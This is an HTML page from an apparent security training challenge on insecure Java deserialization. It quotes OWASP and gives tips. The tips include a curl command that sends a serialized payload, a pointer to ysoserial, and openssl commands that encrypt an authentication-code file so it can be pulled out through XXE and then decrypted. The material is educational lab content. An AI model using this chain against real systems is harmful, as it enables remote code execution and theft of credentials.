
<h4>About the vulnerabilities</h4>
<p>
  The combination of using unpatched 3rd party components and the unsafe use of deserialization can be fatal. 
  The scariest part is that 3rd party components don't even need to be directly used. 
  They only need to be on the class path of the vulnerable application and the class loader will attempt to deserialize them if a vulnerable type is sent.
  </p>
  
  <ul>
  <li>OWASP Top 10 - Using Components with Known Vulnerabilities
      <blockquote>
      <i>Prevalence of this issue is very widespread. Component-heavy development patterns 
          can lead to development teams not even understanding which components they use in their application or API, much less keeping them up to date.</i>    
      <footer>From OWASP <a target="_blank" rel="noopener noreferrer" href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">A9-Using Components with Known Vulnerabilities</a></footer>
      </blockquote>
  </li>
  </ul>
  
  
<ul>
<li>OWASP Top 10 - Insecure Deserialization
    <blockquote>
    <i>The impact of deserialization flaws cannot be overstated. These flaws can lead to remote code execution attacks, one of the most serious attacks possible.</i>
    <footer>From OWASP <a target="_blank" rel="noopener noreferrer" href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">A8-Insecure Deserialization</a></footer>
</blockquote>
</li>
</ul>
<br></br>

<h4>Exploiting Deserialization</h4>
<p>
The Open Source project <a href="https://github.com/frohoff/ysoserial">ysoserial</a> provides an open source tool to test and exploit Insecure Deserialization flaws in Java apps.
</p>
<br></br>


<h5>Challenge Tips and Tricks</h5>
<p>
Once you are logged in you will notice that the application accepts serialized command objects. You can use ysoserial to generate a
base64 encoded object and you can use curl to send the object to the application. 
<pre class="pre-scrollable">
curl -H 'Cookie:JSESSIONID=_YOUR_SESSION_ID_' '_COMMAND_PROC_URL_SUBMIT_COMMAND' -H 'Content-Type: multipart/form-data; boundary=----123' --data-binary '------123\r\nContent-Disposition: form-data; name=\"object\"\r\n\r\nrO0ABXNyAApzZXJpYWwuQ2F0mJizcryhARMCAAFMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHB0AApTZXJpYWwgQ2F0\r\n------123--\r\n' -L
</pre>
<br>
Replace the base64 object in the curl command with the object generated by ysoserial using the command of your choice.
<br><br>
You should have the code for the <code>commandproc</code> Java application from a previous challenge so you can generate your own Command objects to create a STOP command. 
You'll also notice that you don't absolutely need the code, the app can serialize an object for you however it will only accept commands that have the correct authentication code. 
The authentication code is stored in a binary so you can't exfiltrate it with XXE unless you convert it to base64.
<br><br>
Java prevents command chaining so you must use only one command. OpenSSL is ideal for this (also because you don't want to leave the converted command code for other challengers)
<br><br>
Use the command <code>openssl enc -aes-256-ecb -in _AUTH_CODE_FILE_ -out /tmp/_YOUR_FILE_NAME.enc -base64 -k _YOUR_SECRET_</code>
<br><br>
Then you can use the XXE login request (save that in a Burp repeater Tab or Postman tab) to list the contents of <code>file://tmp/</code> and download your encrypted file.
Be careful to remove the \n inserted by API Gateway in the response to the pinger request.
<br><br>
The command  <code>openssl enc -aes-256-ecb -in /_YOUR_FILE_NAME.enc -base64 -k _YOUR_SECRET_ -d -md md5|base64</code> will decrypt the authentication code to a base64 string.
</p>